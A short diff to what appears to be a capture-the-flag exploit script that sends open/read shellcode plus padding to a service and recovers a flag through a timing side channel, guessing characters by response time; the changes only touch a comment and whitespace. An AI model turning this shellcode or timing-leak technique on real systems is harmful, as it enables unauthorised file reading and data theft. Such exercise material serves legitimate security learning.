@@ -39,7 +39,7 @@ while not exit:
 		    push SYS_open /* 2 */
 		    pop rax
 		    syscall
-		    /* call read(3, 'rsp', 0x64) */
+		    /* call read(fd_open, 'rsp', 0x64) */
 		    push rax
 		    xor eax, eax /* SYS_read */
 		    pop rdi
@@ -71,7 +71,7 @@ while not exit:
 		p.sendline(asm(sh) + b'A'*1024)
 		p.recvuntil(b'Time: ')
 		time = float(p.recv().decode('utf-8'))
-		
+
 		if(time > 0.5 and time < 1): # Got the right character!
 			count += 1
 			flag += chr(mid)
